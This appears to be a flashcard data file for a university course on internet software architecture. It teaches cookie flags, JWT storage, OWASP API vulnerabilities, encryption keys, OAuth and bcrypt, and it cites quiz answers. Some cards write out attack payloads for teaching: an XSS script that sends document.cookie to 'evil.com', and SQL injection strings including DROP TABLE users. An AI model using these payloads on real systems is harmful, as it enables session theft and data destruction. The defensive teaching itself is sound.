window.CONTENT["COMP4537"] = {"meta":{"id":"COMP4537","code":"COMP 4537","name":"Internet Software Architecture","exam":"2026-04-24T15:30:00-07:00","room":"SW3 1750","format":"Mixed MCQ and written/short-answer · 1 double-sided printed cheat sheet permitted · Learning Hub (laptop required)","cheatsheet_allowed":true,"instructor":"Amir Amintabar, PhD","notes_html":"\u003cp\u003eThursday April 24, 2026 at 3:30 PM in SW3 1750. Bring one double-sided printed cheat sheet (letter-sized, both sides). No other notes permitted.\u003c/p\u003e"},"modules":[{"id":"m6-api-security","name":"API Security","topics":[{"id":"httponly-cookies","name":"HttpOnly cookies — auth flow and flags","tags":["HttpOnly","cookies","token","SameSite","Secure","XSS","withCredentials"],"prose":"An HttpOnly cookie stores a session token in the browser where JavaScript cannot read it, eliminating the XSS attack surface for token theft. The Secure, SameSite, and Max-Age flags work alongside HttpOnly to restrict transmission, control cross-site sending, and bound the session lifetime.","cards":[{"id":"httponly-cookies-card-01","type":"cloze","prompt":"Setting the {{HttpOnly}} flag blocks JavaScript from reading the cookie value, preventing XSS-based token theft.","answer":"HttpOnly","explanation":"When HttpOnly is set, the browser manages the cookie entirely. No script on the page — including injected Cross-Site Scripting (XSS) payloads — can call document.cookie to retrieve the token value, removing the primary attack vector for session hijacking via script injection.","example":"Set-Cookie: token=abc123; HttpOnly; Path=/; SameSite=None; Secure\n# document.cookie returns \"\" — the token is invisible to JavaScript\n","source":"Slide 9, Slide 10, ISAQuiz11","bloom":"remember"},{"id":"httponly-cookies-card-02","type":"cloze","prompt":"The {{Secure}} cookie flag restricts the cookie to HTTPS connections only, preventing transmission over plain HTTP.","answer":"Secure","explanation":"Without the Secure flag, the browser sends the cookie over both HTTP and HTTPS. An attacker on an unencrypted network can intercept the cookie in plaintext. The Secure flag ensures the cookie only travels over encrypted connections.","example":"Set-Cookie: token=abc123; HttpOnly; Path=/; SameSite=None; Secure\n# Browser refuses to send this cookie over http://\n# Browser sends it over https:// only\n","source":"Slide 9, Slide 10, ISAQuiz11","bloom":"remember"},{"id":"httponly-cookies-card-03","type":"name","prompt":"What are ALL the risks of not setting the HttpOnly attribute on a session cookie? (ISAQuiz11 Q3)","answer":"All of them: XSS token theft, session hijacking, AND CSRF attacks.","explanation":"HttpOnly removes JavaScript read access, which stops XSS-based theft. Without it, any injected script can read and exfiltrate the token (XSS theft), impersonate the user indefinitely (session hijacking), and the stolen token can be replayed cross-site (CSRF). Selecting only XSS scores zero — the flags work as a system, and removing one opens multiple vectors.","example":"# Without HttpOnly:\n# Attacker injects: \u003cscript\u003efetch('evil.com?t='+document.cookie)\u003c/script\u003e\n# Result: token stolen → session hijacked → cross-site replay possible\n","source":"Slide 9, Slide 10, ISAQuiz11","bloom":"analyze"},{"id":"httponly-cookies-card-04","type":"cloze","prompt":"For a cross-origin XMLHttpRequest to send an HttpOnly cookie, the client must set {{withCredentials}} to true AND the server must respond with {{Access-Control-Allow-Credentials}}: true.","answer":"withCredentials; Access-Control-Allow-Credentials","explanation":"Same-origin requests always send cookies automatically. Cross-origin requests strip cookies by default. Both conditions must hold simultaneously: the client opts in with withCredentials, and the server opts in with the CORS credential header. Either condition alone is insufficient — the browser discards the response if the server header is missing even when the client set withCredentials.","example":"// Client (cross-origin XHR)\nconst xhr = new XMLHttpRequest();\nxhr.withCredentials = true;\nxhr.open('GET', 'https://api.example.com/profile');\nxhr.send();\n\n// Server must include in response:\n// Access-Control-Allow-Credentials: true\n","source":"Slide 9, Slide 10, ISAQuiz11","bloom":"apply"},{"id":"httponly-cookies-card-05","type":"predict","prompt":"A client makes a cross-origin XMLHttpRequest to GET /profile. withCredentials is not set (defaults to false). The server has a valid HttpOnly session cookie for this user. Predict what the server receives and why.","answer":"The server receives no cookie. The browser strips all cookies from cross-origin requests when withCredentials is false. The server cannot identify the user and returns 401 Unauthorized.","explanation":"The Same-Origin Policy causes the browser to remove credentials (cookies and auth headers) from cross-origin requests unless the client explicitly opts in with withCredentials. The HttpOnly flag is irrelevant here — the cookie exists in the browser but the browser refuses to attach it to the cross-origin request.","example":"// withCredentials omitted — defaults to false\nconst xhr = new XMLHttpRequest();\nxhr.open('GET', 'http://api.otherdomain.com/profile');\nxhr.send();\n// Cookie header: absent\n// Server response: 401 Unauthorized\n","source":"Slide 9, Slide 10, ISAQuiz11","bloom":"apply","lang":"js"},{"id":"httponly-cookies-card-06","type":"cloze","prompt":"To delete an HttpOnly cookie on logout, the server sets {{Max-Age=0}} in the Set-Cookie header. All other attributes must match the original cookie exactly.","answer":"Max-Age=0","explanation":"The browser matches a Set-Cookie deletion directive against the stored cookie using its name, Path, Domain, and SameSite attributes. If any attribute differs, the browser treats the directive as a new cookie rather than a deletion of the existing one, leaving the original session cookie intact. Max-Age=0 is the mechanism that signals immediate deletion.","example":"# Login sets:\nSet-Cookie: token=R99R; HttpOnly; Path=/; SameSite=None; Secure; Max-Age=60\n\n# Logout must send — all attributes matching:\nSet-Cookie: token=; HttpOnly; Path=/; Max-Age=0; SameSite=None; Secure\n","source":"Slide 9, Slide 10, ISAQuiz11","bloom":"apply"},{"id":"httponly-cookies-card-07","type":"name","prompt":"What does SameSite=None require, and why does the requirement exist?","answer":"SameSite=None requires the Secure flag to also be set. Without Secure, browsers reject the SameSite=None directive entirely.","explanation":"SameSite=None allows the cookie to be sent on cross-origin requests. Browsers enforce that this permissive setting is paired with HTTPS-only transmission to prevent the cookie from traveling over an unencrypted channel where cross-site delivery would also expose it to interception.","example":"# Valid — browser accepts and sends cross-origin:\nSet-Cookie: token=abc; SameSite=None; Secure; HttpOnly\n\n# Invalid — browser ignores or rejects:\nSet-Cookie: token=abc; SameSite=None; HttpOnly\n","source":"Slide 9, Slide 10, ISAQuiz11","bloom":"understand"}]},{"id":"jwt","name":"JWT — structure, signing, and storage","tags":["JWT","json-web-token","signing","secret-key","HS256","XSS"],"prose":"A JSON Web Token (JWT) is a compact, self-contained token the server signs with a secret key using HS256. The token has three dot-separated parts — header, payload, and signature — all Base64url-encoded. The server signs the token at login and verifies the signature on every subsequent request, enabling stateless authentication. The token must be stored in an HttpOnly cookie to prevent XSS-based theft; localStorage exposes it to any injected script. The secret key must be stored in an environment variable, never in source code. Short expiration times limit the damage a stolen token can cause.","cards":[{"id":"jwt-card-01","type":"name","prompt":"JWT stands for ___.","answer":"JSON Web Token","explanation":"JWT is the abbreviation for JSON Web Token. Common distractors on ISAQuiz11 include JavaScript Web Token and JSON Web Transfer — both are wrong. The J stands for JSON (a data format), not JavaScript.","example":"import jwt from 'jsonwebtoken'; // JSON Web Token library","source":"Slide 10, ISAQuiz11","bloom":"remember"},{"id":"jwt-card-02","type":"cloze","prompt":"A JWT consists of three dot-separated parts: header.{{payload}}.signature","answer":"payload","explanation":"The three parts of a JWT are header, payload, and signature — all Base64url-encoded and joined by dots. The payload contains claims (e.g., username, expiry). The signature is the HMAC of the header and payload using the server's secret key.","example":"eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.\u003csignature\u003e","source":"Slide 10, ISAQuiz11","bloom":"remember"},{"id":"jwt-card-03","type":"name","prompt":"ISAQuiz11 Q5 asks which option correctly lists JWT components. Which answer is correct, and why are the distractors wrong?","answer":"Header, Payload, and Signature. Distractors use 'Certificate' (not a JWT part) and 'Body' or 'Footer' (not JWT terms).","explanation":"The JWT spec defines exactly three parts: header, payload, signature. Certificate is a PKI concept unrelated to JWT structure. Body and Footer are HTML or email terms. Selecting any distractor on the exam scores zero.","example":"base64url(header).base64url(payload).base64url(signature)","source":"Slide 10, ISAQuiz11","bloom":"understand"},{"id":"jwt-card-04","type":"cloze","prompt":"The server signs a JWT using the {{HS256}} algorithm and its secret key. On the next request, it recomputes the signature and compares — no session store required.","answer":"HS256","explanation":"HS256 is HMAC with SHA-256. The server signs header+payload with the secret key. Any modification to the token invalidates the signature. The server verifies by recomputing the signature — stateless, no database lookup needed.","example":"jwt.sign({ username }, TOKEN_SECRET, { algorithm: 'HS256', expiresIn: '120s' })","source":"Slide 10, ISAQuiz11","bloom":"understand"},{"id":"jwt-card-05","type":"cloze","prompt":"Storing a JWT in {{localStorage}} exposes it to XSS attacks because JavaScript can read it. Storing it in an {{HttpOnly}} cookie blocks that attack because the browser never exposes the value to scripts.","answer":"localStorage; HttpOnly","explanation":"localStorage is accessible to any script on the page, including injected XSS payloads. An HttpOnly cookie is transmitted by the browser automatically but is invisible to JavaScript — eliminating the main XSS token-theft vector. Add Secure and SameSite attributes to also block CSRF.","example":"res.setHeader('Set-Cookie', `token=${token}; HttpOnly; Secure; SameSite=None`);","source":"Slide 10, ISAQuiz11","bloom":"understand"},{"id":"jwt-card-06","type":"predict","prompt":"A developer writes: jwt.sign({ foo: 'bar' }, 'shhhhh!'); Predict the two security problems this causes.","answer":"1. No expiration — the token never becomes invalid, so a stolen token grants permanent access. 2. Weak secret ('shhhhh!') — short, guessable secrets can be brute-forced; HS256 security depends entirely on secret length and randomness.","explanation":"jwt.sign() requires both a strong secret key and an expiresIn option for production use. A missing expiration means revocation is impossible without a blocklist. A short secret breaks the cryptographic guarantee of HS256.","example":"// Correct version:\njwt.sign({ foo: 'bar' }, process.env.TOKEN_SECRET, { algorithm: 'HS256', expiresIn: '120s' });\n","source":"Slide 10, ISAQuiz11","bloom":"apply","lang":"js"},{"id":"jwt-card-07","type":"name","prompt":"ISAQuiz11 Q8: A JWT cookie is set without HttpOnly and without Secure. Which attack vectors are exposed?","answer":"All three: XSS (script can read the cookie), CSRF (cookie sent on cross-site requests), and unauthorized access (cookie visible over plain HTTP).","explanation":"HttpOnly blocks JavaScript access (XSS vector). Secure restricts transmission to HTTPS (interception vector). SameSite blocks cross-site cookie submission (CSRF vector). Removing both HttpOnly and Secure simultaneously opens all three. The correct exam answer is 'All of the above' — selecting only XSS scores zero.","example":"// Missing: HttpOnly blocks XSS; Secure blocks plaintext; SameSite blocks CSRF","source":"Slide 10, ISAQuiz11","bloom":"analyze"}]},{"id":"api-security-best-practices","name":"API security vulnerabilities (OWASP top 8 for APIs)","tags":["security","SQL-injection","rate-limiting","OWASP","mass-assignment","XSS"],"prose":"Eight recurring API vulnerabilities — broken authentication, excessive data exposure, missing rate limiting, broken function-level authorization, broken object-level authorization (BOLA), mass assignment, security misconfiguration, and injection — each follow a predictable mechanism. Knowing the mechanism determines the fix: parameterized queries stop injection, object-level ACLs stop BOLA, field whitelisting stops mass assignment, and server-side filtering stops data exposure.","cards":[{"id":"api-security-best-practices-card-01","type":"predict","prompt":"The following Express.js route builds a SQL query using a template literal:\n\n```js\nconst query = `UPDATE users SET email='${newEmail}' WHERE id=${userId}`;\nconst result = database.query(query);\n```\n\nAn attacker sets `newEmail` to `' WHERE 1=1; DROP TABLE users; --`. What attack does this enable, and what happens to the database?\n","answer":"SQL injection. The attacker's input becomes literal SQL syntax inside the query string. The database executes `DROP TABLE users`, deleting all user records.","explanation":"Template-literal interpolation embeds user-controlled values directly into the SQL string. The database cannot distinguish the injected SQL from the intended query structure. The fix is parameterized queries: `const query = 'UPDATE users SET email=? WHERE id=?'; database.query(query, [newEmail, userId]);` — the driver passes the values as bound data, so SQL syntax in the values never executes.","example":"// Attacker payload for newEmail:\n' WHERE 1=1; DROP TABLE users; --\n\n// Resulting query string:\nUPDATE users SET email='' WHERE 1=1; DROP TABLE users; --' WHERE id=42\n// Database executes the DROP TABLE statement\n","source":"Slide 12, ISAQuiz12","bloom":"analyze","lang":"js"},{"id":"api-security-best-practices-card-02","type":"cloze","prompt":"To prevent SQL injection, use {{parameterized queries}} with `?` placeholders instead of string interpolation. The database driver passes substituted values as {{data}}, so injected SQL syntax never executes.","answer":"parameterized queries; data","explanation":"String interpolation (template literals or concatenation) builds the SQL command as a single string — user input becomes part of the SQL structure. Parameterized queries send the SQL template and the data values separately to the database driver. The driver handles escaping and binding, ensuring values are always treated as data literals regardless of their content.","example":"// Vulnerable:\nconst query = `UPDATE users SET email='${newEmail}' WHERE id=${userId}`;\n\n// Safe:\nconst query = 'UPDATE users SET email=? WHERE id=?';\nconst result = database.query(query, [newEmail, userId]);\n","source":"Slide 12, ISAQuiz12","bloom":"remember"},{"id":"api-security-best-practices-card-03","type":"name","prompt":"ISAQuiz12 Q2 offered `.replace()` (removing quotes from user input) as an option for preventing SQL injection. Is `.replace()` an effective fix? Why or why not?","answer":"No. `.replace()` is bypassable. Attackers use hex encodings, multi-byte characters, and other bypass vectors that do not rely on single quotes. Only parameterized queries prevent SQL injection reliably.","explanation":"String sanitization with `.replace()` tries to remove dangerous characters after the fact. Attackers have many encoding techniques to reintroduce dangerous characters without using the exact characters that `.replace()` strips. Parameterized queries prevent injection at the protocol level — the database driver never tries to parse the values as SQL at all. ISAQuiz12 Q2 and exam-strategy Pitfall 5 both mark `.replace()` as incorrect.","example":"// .replace() approach — bypassed:\nconst safeEmail = newEmail.replace(/'/g, '');\n// Attacker uses: ` OR 1=1 --  (no single quote needed)\n// Still injects valid SQL\n\n// Parameterized — not bypassable:\nconst query = 'UPDATE users SET email=? WHERE id=?';\ndatabase.query(query, [newEmail, userId]);\n","source":"Slide 12, ISAQuiz12","bloom":"analyze"},{"id":"api-security-best-practices-card-04","type":"name","prompt":"ISAQuiz12 Q3: Which of these options is NOT an example of Excessive Data Exposure? (a) API returns full user record including SSN when only name and email were requested. (b) API returns detailed error message containing the database schema. (c) API endpoint returns all student grades and relies on client-side filtering. (d) Filtering out and removing unnecessary details from Error Messages before displaying them to users.","answer":"(d) Filtering out unnecessary details from error messages. That is the PREVENTION of Excessive Data Exposure, not an example of it.","explanation":"Options (a), (b), and (c) are all examples of the vulnerability: the server sends more data than needed, exposes sensitive internal information, or delegates filtering to the client. Option (d) describes the correct defense — stripping sensitive details from error messages before they reach the client. Confusing the prevention with an instance of the vulnerability is the exact trap ISAQuiz12 Q3 tests.","example":"// Example of the vulnerability — detailed error sent to client:\nres.status(500).json({ error: error.message, stack: error.stack, schema: 'users(id, email, ssn)' });\n\n// Correct prevention:\nres.status(500).json({ error: 'Internal Server Error' });\n","source":"Slide 12, ISAQuiz12","bloom":"analyze"},{"id":"api-security-best-practices-card-05","type":"name","prompt":"What is Broken Object-Level Authorization (BOLA), and what does the ISAQuiz12 Q7 `getResourceOwner` code demonstrate about it?","answer":"BOLA occurs when the server authenticates a user but does not verify whether that user owns the specific object they are accessing or modifying. The Q7 code returns a hardcoded owner ID ('user123') instead of looking up the real owner, so any user with that cookie value passes the ownership check for every resource ID.","explanation":"Authentication confirms who the user is. Object-level authorization confirms whether that user is allowed to act on a specific resource. BOLA skips the second check. In Q7, `getResourceOwner(resourceId)` always returns `'user123'` — any user matching that cookie can modify any profile by changing the URL parameter. The fix requires looking up the actual owner for the requested resource and comparing it to the authenticated user.","example":"// Vulnerable — hardcoded owner:\nfunction getResourceOwner(resourceId) {\n  return 'user123'; // never queries the real owner\n}\n\n// Fixed — look up the actual owner:\nasync function getResourceOwner(resourceId) {\n  const resource = await Resource.findById(resourceId);\n  return resource.ownerId;\n}\n","source":"Slide 12, ISAQuiz12","bloom":"analyze"},{"id":"api-security-best-practices-card-06","type":"name","prompt":"What is mass assignment, and how does an attacker exploit it?","answer":"Mass assignment occurs when an API passes the raw request body directly to a model, letting the client set any property — including privileged ones like `isAdmin`. An attacker adds `'isAdmin': true` to the request JSON and elevates their own account.","explanation":"Frameworks that map request body keys to model properties automatically make it easy to write `User.update(req.body)`. If the model has an `isAdmin` field, the attacker sets it. Prevention requires whitelisting the specific properties to accept: `const { name, email } = req.body; User.update({ name, email });` — any extra properties the attacker sends are simply ignored.","example":"// Attacker sends:\n{ \"name\": \"Alice\", \"email\": \"alice@example.com\", \"isAdmin\": true }\n\n// Vulnerable server:\nconst user = await User.update(req.body); // isAdmin is set\n\n// Safe server:\nconst { name, email } = req.body;\nconst user = await User.update({ name, email }); // isAdmin ignored\n","source":"Slide 12, ISAQuiz12","bloom":"apply"},{"id":"api-security-best-practices-card-07","type":"name","prompt":"What is the purpose of rate limiting on a login endpoint, and at which levels should rate limiting be applied?","answer":"Rate limiting on login endpoints mitigates brute force attacks by capping how many requests a client can make in a time window. Apply rate limiting at three levels: IP address, user account, and application.","explanation":"Without rate limiting, an attacker can try thousands of password guesses per second. Limiting by IP slows single-source attacks. Limiting by user account catches attacks spread across IPs targeting the same account. Application-level limiting protects against distributed attacks that exceed per-IP thresholds. ISAQuiz12 Q4 confirmed the purpose is brute force mitigation; Q8 confirmed account lockout as an effective measure.","example":"// IP-level rate limit with express-rate-limit:\nconst limiter = rateLimit({\n  windowMs: 15 * 60 * 1000,\n  max: 100,\n  message: 'Too many requests from this IP, please try again later.'\n});\napp.use('/api/login', limiter);\n\n// Account lockout after 3 attempts:\nif (loginAttempts[ip] \u003e= 3) {\n  return res.status(429).json({ message: 'Too many login attempts. Try again later.' });\n}\n","source":"Slide 12, ISAQuiz12","bloom":"apply"},{"id":"api-security-best-practices-card-08","type":"cloze","prompt":"{{Security Misconfiguration}} occurs when an API is left in an insecure state — for example, leaving default credentials unchanged or storing a JWT secret as a hardcoded string in source code instead of an {{environment variable}}.","answer":"Security Misconfiguration; environment variable","explanation":"Default passwords on database systems are documented and widely known — an attacker simply tries them. Hardcoded secrets in source code are exposed to anyone with repository access, including CI/CD pipelines. ISAQuiz12 Q5 confirmed 'leaving default credentials unchanged in a production environment' as an example of Security Misconfiguration. The fix: rotate all defaults before deployment and load secrets from environment variables.","example":"// Misconfiguration — secret hardcoded:\njwt.verify(token, 'secretkey', (err, decoded) =\u003e { ... });\n\n// Correct — secret from environment:\njwt.verify(token, process.env.JWT_SECRET, (err, decoded) =\u003e { ... });\n","source":"Slide 12, ISAQuiz12","bloom":"remember"},{"id":"api-security-best-practices-card-09","type":"name","prompt":"ISAQuiz12 Q9: Which response prevents Excessive Data Exposure when an error occurs on the server? (a) `res.status(500).json({ error: 'Internal Server Error' })` (b) `console.log('Error occurred: ' + error.message)` (c) `alert('Error: ' + error)`","answer":"(a) `res.status(500).json({ error: 'Internal Server Error' })`. It returns a generic message to the client. Options (b) and (c) leak error details.","explanation":"Option (b) logs error details server-side — not necessarily a client exposure, but it does not respond to the client at all. Option (c) exposes `error.toString()` directly to the user, which includes internal details. Option (a) returns a fixed generic string with no internal information. ISAQuiz12 Q9 confirmed (a) as the correct answer.","example":"// Leaks internal details to the client:\nres.status(500).json({ error: error.message, stack: error.stack });\n\n// Correct — generic message only:\nres.status(500).json({ error: 'Internal Server Error' });\n// Log details server-side separately:\nconsole.error(error);\n","source":"Slide 12, ISAQuiz12","bloom":"apply"},{"id":"api-security-best-practices-card-10","type":"name","prompt":"What is Multi-Factor Authentication (MFA), and which ISAQuiz12 question confirmed its definition?","answer":"MFA requires multiple independent forms of identification before granting access — for example, a password plus a one-time code sent to a phone. ISAQuiz12 Q11 defined MFA as 'multiple forms of identification.'","explanation":"A single factor (password) fails if the credential is guessed, phished, or leaked. MFA adds a second factor (something you have, such as a phone, or something you are, such as biometrics) so that compromising one factor is not sufficient. MFA is the primary prevention for Broken User Authentication alongside session management and rate limiting.","example":"// MFA flow:\n// Step 1: user submits username + password\n// Step 2: server validates credentials, sends OTP to user's phone\n// Step 3: user submits OTP\n// Step 4: server validates OTP, creates session\n","source":"Slide 12, ISAQuiz12","bloom":"remember"}]},{"id":"public-private-keys","name":"Symmetric and asymmetric encryption — key exchange and signing","tags":["asymmetric","symmetric","public-key","private-key","RSA","signing"],"prose":"Symmetric encryption uses one secret key shared by both parties. Getting that key to the other party over an untrusted network is the key exchange problem. Asymmetric encryption solves this by giving each party a public key (shared openly) and a private key (never shared). Signing and encryption use opposite key directions: signing uses the sender's private key and is verified with the sender's public key; encryption uses the receiver's public key and is decrypted with the receiver's private key. RSA implements asymmetric cryptography; Diffie-Hellman establishes a shared secret key without transmitting it. Never conflate a secret key (symmetric) with a private key (asymmetric).","cards":[{"id":"public-private-keys-card-01","type":"cloze","prompt":"To verify a message signed by Amir, Tom uses Amir's {{public key}}.","answer":"public key","explanation":"Signing uses the sender's private key; anyone with the sender's public key can verify the signature. Tom does not use his own keys to verify — he uses the key that Amir shares openly.","example":"Amir signs the outer envelope with amir_private_key. Tom calls verify(outer, amir_public_key). If it opens, the message came from Amir.","source":"Slide 10, ISAQuiz11 Q9","bloom":"remember"},{"id":"public-private-keys-card-02","type":"cloze","prompt":"Symmetric encryption uses {{one}} key shared between both parties; asymmetric encryption uses a {{public/private}} key pair.","answer":"one; public/private","explanation":"Symmetric encryption's single secret key creates the key exchange problem. Asymmetric encryption's key pair eliminates it: the public key travels openly, the private key never leaves its owner.","example":"AES (symmetric): Alice and Bob both hold the same 256-bit secret key. RSA (asymmetric): Alice publishes alice_public_key; she keeps alice_private_key secret.","source":"Slide 9, Slide 10","bloom":"remember"},{"id":"public-private-keys-card-03","type":"name","prompt":"What problem does RSA solve, and what problem does Diffie-Hellman solve?","answer":"RSA is an asymmetric encryption algorithm that enables encryption and digital signing without a pre-shared secret key. Diffie-Hellman is a key-exchange protocol that lets two parties derive a shared secret key over an untrusted network without ever transmitting the key itself.","explanation":"RSA and Diffie-Hellman address different halves of the key exchange problem. RSA sidesteps symmetric key exchange entirely by using key pairs. Diffie-Hellman makes symmetric key exchange safe by constructing the shared secret mathematically on each side without sending it.","example":"TLS uses Diffie-Hellman to establish a session secret key, then uses that secret key with symmetric encryption (e.g., AES) for the bulk of the data transfer.","source":"Slide 9","bloom":"understand"},{"id":"public-private-keys-card-04","type":"predict","prompt":"Amir encrypted a message with Tom's public key and sent it. Tom receives the ciphertext. Which key can open it?","answer":"Tom's private key","explanation":"Encryption for confidentiality uses the receiver's public key. The mathematically linked private key — held only by Tom — is the only key that can decrypt it. Anyone who intercepts the ciphertext cannot open it without Tom's private key.","example":"const inner = encrypt(message, tom_public_key);\n// Only tom_private_key can decrypt `inner`\nconst message = decrypt(inner, tom_private_key);\n","source":"Slide 9, Slide 10","bloom":"apply","lang":"js"},{"id":"public-private-keys-card-05","type":"predict","prompt":"ISAQuiz11 Q9 scenario: Amir sent a message to Tom using asymmetric encryption. Amir signed the outer envelope with his private key. Which key does Tom use to verify the authenticity of the message?","answer":"Amir's public key","explanation":"Verification uses the SENDER's public key — not the receiver's keys. Amir signed with amir_private_key, so the paired amir_public_key is the only key that can verify the signature. Tom's own keys are not involved in verification. The distractors in ISAQuiz11 Q9 include Tom's private key, Tom's public key, and Amir's private key — all wrong.","example":"const inner = verify(outer, amir_public_key);\n// Success → outer came from Amir and was not tampered with\n","source":"Slide 10, ISAQuiz11 Q9","bloom":"analyze","lang":"js"},{"id":"public-private-keys-card-06","type":"name","prompt":"Complete the key direction table for asymmetric encryption: (a) Signing — sender uses ___, receiver verifies with ___. (b) Encryption — sender uses ___, receiver decrypts with ___.","answer":"(a) Signing: sender uses sender's private key; receiver verifies with sender's public key. (b) Encryption: sender uses receiver's public key; receiver decrypts with receiver's private key.","explanation":"Signing and encryption use opposite key directions. Signing proves authorship (private key in, public key to verify). Encryption ensures confidentiality (public key in, private key to open). Confusing these two directions is the root cause of ISAQuiz11 Q9 wrong answers.","example":"Amir→Tom:\n  sign:    amir_private_key   → verified with amir_public_key\n  encrypt: tom_public_key     → decrypted with tom_private_key\n","source":"Slide 9, Slide 10, ISAQuiz11","bloom":"analyze"},{"id":"public-private-keys-card-07","type":"name","prompt":"What is the difference between a secret key and a private key?","answer":"A secret key is the shared key used in symmetric encryption — both parties hold the same key. A private key is one half of an asymmetric key pair — only its owner holds it, and it is paired with a public key that is shared openly. The two terms describe different cryptographic systems and must not be used interchangeably.","explanation":"In web development, 'secret key' appears in contexts like session tokens, JWT signing secrets (symmetric HMAC), and OAuth client secrets. 'Private key' appears in RSA-based JWT signing and TLS. Both must stay confidential, but they operate under different models.","example":"JWT with HS256: signed with a secret key (symmetric — same key verifies).\nJWT with RS256: signed with a private key (asymmetric — public key verifies).\n","source":"Slide 11","bloom":"understand"}]},{"id":"oauth-ssl","name":"OAuth 2.0 and SSL/TLS","tags":["OAuth","bearer-token","SSL","TLS","HTTPS","client-id","client-secret"],"prose":"OAuth 2.0 is an access-delegation standard. It lets a ClientApp access a user's data on Google (or another provider) without ever handling the user's password. The app owner registers once and receives a client ID (public) and client secret (private). When a user logs in, Google authenticates them, shows a consent screen, and issues a bearer token to ClientApp. Anyone who holds this token is implicitly granted authorization, so the token must be protected and is time-limited. SSL/TLS (TLS is current; SSL is deprecated) encrypts the HTTP channel automatically via a TLS handshake — HTTPS is HTTP over TLS. The server's SSL/TLS certificate carries its public key, enabling key exchange without prior shared secrets.","cards":[{"id":"oauth-ssl-card-01","type":"cloze","prompt":"In OAuth 2.0, the bearer token grants authorization because {{anyone who holds this token is implicitly granted authorization}}.","answer":"anyone who holds this token is implicitly granted authorization","explanation":"The bearer model means possession equals authorization. No additional proof of identity is required beyond holding the token. This is why bearer tokens must be kept private and are time-limited — if leaked, any holder gains the same access as the legitimate app.","example":"ClientApp stores the bearer token server-side and never logs it. If an attacker obtains the token from a log file, they can call Google APIs as if they were ClientApp acting on behalf of that user — until the token expires.","source":"Slide 11","bloom":"remember"},{"id":"oauth-ssl-card-02","type":"name","prompt":"What two credentials does Google create for a ClientApp during OAuth 2.0 onboarding?","answer":"Client ID and client secret","explanation":"The client ID is a public identifier included in redirect URLs — it is visible to anyone inspecting network traffic. The client secret is private and stored server-side only; it is never sent to the browser. These credentials identify the app, not the user. The bearer token issued later identifies the user's authorization grant.","example":"App owner submits the onboarding form at Google Developer Console listing required scopes (profile, email). Google responds with CLIENT_ID = 'abc123' (public) and CLIENT_SECRET = 'xyz789' (private, never expose).","source":"Slide 11","bloom":"remember"},{"id":"oauth-ssl-card-03","type":"name","prompt":"In the OAuth 2.0 login flow, at what step does the user see a consent screen, and what triggers it?","answer":"After ClientApp redirects the user to Google's OAuth 2.0 endpoint with the client ID and requested scopes — Google looks up the client ID and displays the consent screen listing what data the app wants to access.","explanation":"The consent screen is Google's mechanism for informed user approval. It shows the user exactly which data the app has requested (e.g., 'ClientApp wants to read your name and email'). Only after the user clicks Allow does Google generate the bearer token and redirect back to ClientApp.","example":"ClientApp redirects to: https://accounts.google.com/o/oauth2/auth?client_id=abc123&scope=profile+email — Google shows: 'ClientApp wants access to: your name, your email address.' User clicks Allow.","source":"Slide 11","bloom":"understand"},{"id":"oauth-ssl-card-04","type":"name","prompt":"What does the TLS handshake establish, and what role does the server's SSL/TLS certificate play in it?","answer":"The TLS handshake establishes an encrypted channel between browser and server. The server's SSL/TLS certificate carries the server's public key, which the browser uses to securely exchange a session key — proving the server's identity and enabling encrypted communication.","explanation":"TLS (Transport Layer Security) is the current protocol; SSL is deprecated. The certificate is signed by a trusted Certificate Authority, so the browser can verify the server is who it claims to be. After the handshake, all data is encrypted and decrypted automatically — application code does not implement this. HTTPS = HTTP over TLS.","example":"Browser opens https://myapp.com → server sends certificate containing public key → browser verifies certificate → they negotiate a session key → all subsequent HTTP requests and responses are encrypted transparently.","source":"Slide 11","bloom":"understand"},{"id":"oauth-ssl-card-05","type":"name","prompt":"Why is the OAuth 2.0 bearer token time-limited, and what is a typical expiry window?","answer":"The bearer token is time-limited (e.g., 6 months) because possession equals authorization — anyone who holds the token gains access. Expiry limits the damage window if the token is leaked or stolen.","explanation":"Because the bearer model does not require identity proof beyond possession, a leaked token grants the attacker full access to the approved scopes until it expires. A time limit (combined with HTTPS transport and server-side storage) reduces exposure. After expiry, the user must re-authorize to issue a new token.","example":"A bearer token issued on January 1 with a 6-month expiry becomes invalid July 1. If an attacker obtained the token in March, they lose access July 1 without any action by the app or user — expiry is automatic.","source":"Slide 11","bloom":"apply"},{"id":"oauth-ssl-card-06","type":"name","prompt":"What does OAuth 2.0 delegation mean for ClientApp's authentication responsibilities?","answer":"ClientApp delegates the responsibility of authenticating users to Google. ClientApp does not store or verify Google passwords. It accepts Google's bearer token as proof that the user authenticated successfully, and gains scoped access to user data depending on what the user approved.","explanation":"Delegation shifts the security burden of password storage and verification to Google. ClientApp only needs to protect the bearer token it receives. This also means ClientApp gains real user data (name, email, etc.) without a separate user-database step, because Google supplies it via the API calls made with the bearer token.","example":"Without OAuth 2.0: ClientApp stores hashed Google passwords, runs its own login page, handles password resets — a large attack surface. With OAuth 2.0: ClientApp redirects to Google, receives a bearer token, calls /userinfo — no passwords stored anywhere.","source":"Slide 11","bloom":"apply"}]},{"id":"password-hashing","name":"Password hashing with bcrypt","tags":["bcrypt","hash","salt","password-storage"],"prose":"Passwords must be hashed before storage. bcrypt.hash() is async (returns a Promise — must be awaited). The cost factor controls hashing iterations (2^CF). bcrypt.compare() verifies a plaintext against a stored hash and returns a boolean — it never decrypts.","cards":[{"id":"password-hashing-card-01","type":"cloze","prompt":"The second argument to `bcrypt.hash()` is the {{cost factor}}, which controls the number of hashing iterations.","answer":"cost factor","explanation":"The cost factor (also called salt rounds) determines how many iterations bcrypt performs internally. With a cost factor of 10, bcrypt runs 2^10 = 1,024 iterations. A higher value makes each hash computation slower, which increases resistance to brute-force attacks.","example":"const hash = await bcrypt.hash(password, 10); // 10 is the cost factor","source":"Slide 11","bloom":"remember"},{"id":"password-hashing-card-02","type":"name","prompt":"Why should you hash passwords instead of encrypting them before storing them in a database?","answer":"Hashing is one-way — the server cannot reverse a hash, and no decryption key exists. Encryption is reversible: whoever holds the server's key can decrypt all stored passwords. If the server is compromised, an attacker gains the key and can recover every encrypted password. A hash breach exposes only hashes, not the original passwords.","explanation":"The fundamental property needed for password storage is irreversibility. Hashing provides that. Encryption does not — the decryption key always exists somewhere, and it lives on the same server as the data.","example":"Attacker breaches DB + server: encrypted passwords → decrypt with stolen key → all passwords exposed. Hashed passwords → only hashes → originals unrecoverable.","source":"Slide 